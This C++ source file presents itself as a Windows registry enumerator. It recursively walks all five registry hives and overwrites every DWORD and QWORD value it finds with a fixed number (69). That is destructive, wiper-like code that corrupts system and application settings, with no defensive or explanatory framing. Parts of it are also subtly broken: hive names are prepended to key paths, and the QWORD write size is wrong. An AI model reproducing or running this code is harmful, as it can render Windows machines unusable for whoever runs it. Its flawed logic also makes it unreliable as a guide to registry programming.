#include <windows.h>
#include <iostream>

#include "enumerator.h"

void RegistryEnum(HKEY Hive, const std::wstring& subkey, const std::wstring &fullpath_);
void CHANGE(HKEY Hive, const std::wstring& subKey, const std::wstring &value, DWORD nValue, DWORD Type__);

/*
    Change it to desired value,
    its in decimal. WinAPI will convert it into hexdecimal.
    putting 69 here actually gonna set value 0x45
*/

DWORD Change_To = 69;

void Registry_Enum::Panel_()
{    
    struct HvInf 
    {
        HKEY hive;
        std::wstring HvName;
    };
    
    HvInf Hives[] = {
        {HKEY_CLASSES_ROOT, L"HKEY_CLASSES_ROOT"},
        {HKEY_CURRENT_USER, L"HKEY_CURRENT_USER"},
        {HKEY_LOCAL_MACHINE, L"HKEY_LOCAL_MACHINE"},
        {HKEY_USERS, L"HKEY_USERS"},
        {HKEY_CURRENT_CONFIG, L"HKEY_CURRENT_CONFIG"}
    };

    for (const auto &hInf : Hives)
    {   
        RegistryEnum(hInf.hive, L"", hInf.HvName);
    }
}

void RegistryEnum(HKEY Hive, const std::wstring& subkey, const std::wstring& fullpath_ = L"")
{
    HKEY hKey;

    if (RegOpenKeyExW(Hive, subkey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
    {
        return;
    }

    wchar_t Subkey_Name[256];

    DWORD Subkey_Size = sizeof(Subkey_Name) / sizeof(Subkey_Name[0]) - 1;
    DWORD Subkey_Index = 0;

    while(RegEnumKeyExW(hKey, Subkey_Index, Subkey_Name, &Subkey_Size, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS)
    {
        std::wstring nowpath;

        if (fullpath_.empty())
        {
            nowpath = Subkey_Name;
        } 
        else 
        {
            nowpath = fullpath_ + L"\\" + Subkey_Name;
        }

        if (subkey.empty())
        {
            RegistryEnum(Hive, Subkey_Name, nowpath);
        } 
        else 
        {
            RegistryEnum(Hive, subkey + L"\\" + Subkey_Name, nowpath);
        }
        
        Subkey_Size = sizeof(Subkey_Name) / sizeof(Subkey_Name[0]);
        ++Subkey_Index;
    }

    // End of subkeying recursion.

    wchar_t Value_Name[256];

    DWORD Value_Index = 0;
    DWORD Value_Size = sizeof(Value_Name) / sizeof(Value_Name[0]);

    BYTE Value_Data[512];
    DWORD Value_Data_Size = sizeof(Value_Data);
    DWORD Value_Type;

    while(RegEnumValueW(hKey, Value_Index, Value_Name, &Value_Size, nullptr, &Value_Type, Value_Data, &Value_Data_Size) == ERROR_SUCCESS)
    {
        HKEY Key;

        CHANGE(Hive, fullpath_, Value_Name, Change_To, Value_Type);
        
        Value_Size = sizeof(Value_Name) / sizeof(Value_Name[0]);
        Value_Data_Size = sizeof(Value_Data);
        ++Value_Index;
    }

    RegCloseKey(hKey);
}

void CHANGE(HKEY Hive, const std::wstring& subKey, const std::wstring &value, DWORD nValue, DWORD Type__)
{
    HKEY Key;

    if (RegOpenKeyExW(Hive, subKey.c_str(), 0, KEY_SET_VALUE, &Key) == ERROR_SUCCESS)
    {
        if (Type__ == REG_DWORD)
        {
            const BYTE* V_Byte = reinterpret_cast<const BYTE*>(&nValue);
            RegSetValueExW(Key, value.c_str(), 0, REG_DWORD, V_Byte, sizeof(nValue));
        }

        else if (Type__ == REG_QWORD)
        {
            ULONGLONG nValueU = nValue;
            const BYTE* nValueU_Byte = reinterpret_cast<const BYTE*>(&nValueU);
            RegSetValueExW(Key, value.c_str(), 0, REG_QWORD, nValueU_Byte, sizeof(nValue));
        }
    }
}